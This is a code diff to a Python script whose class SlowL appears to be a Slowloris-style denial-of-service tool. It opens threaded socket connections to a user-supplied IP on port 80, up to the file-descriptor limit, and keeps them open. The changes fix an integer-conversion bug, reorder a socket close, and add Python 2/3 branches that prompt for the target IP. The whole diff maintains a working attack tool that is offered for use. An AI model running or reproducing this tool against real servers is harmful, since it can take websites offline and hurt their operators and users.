@@ -10,7 +10,7 @@ class SlowL:
 		self.port = port
 		self.open = 0
 		while True:
-			if self.open < int(maxt):
+			if self.open < maxt:
 				t = threading.Thread(target=self.handler)
 				t.daemon = True
 				t.start()
@@ -22,8 +22,8 @@ class SlowL:
 		try:
 			sock.connect((self.ip, self.port))
 		except:
-			sock.close()
 			self.open -= 1
+			sock.close()
 			return
 		while True:
 			try:
@@ -35,7 +35,15 @@ class SlowL:
 				break
 
 if __name__ == '__main__':
-	print("Set ulimit -n to 2000")
-	ips = input("IP NOW: ")
-	mat = subprocess.check_output(["ulimit", "-n"])
-	s = SlowL(ips, 80, mat)
+	if sys.version_info[0] < 3:
+		print("Python version 2.x")
+		print("Set ulimit -n to 2000")
+		ips = raw_input("IP NOW: ")
+		mat = int(subprocess.check_output(["ulimit", "-n"]))
+		s = SlowL(ips, 80, mat)
+	else:
+		print("Python version 3.x")
+		print("Set ulimit -n to 2000")
+		ips = input("IP NOW: ")
+		mat = int(subprocess.check_output(["ulimit", "-n"]))
+		s = SlowL(ips, 80, mat)
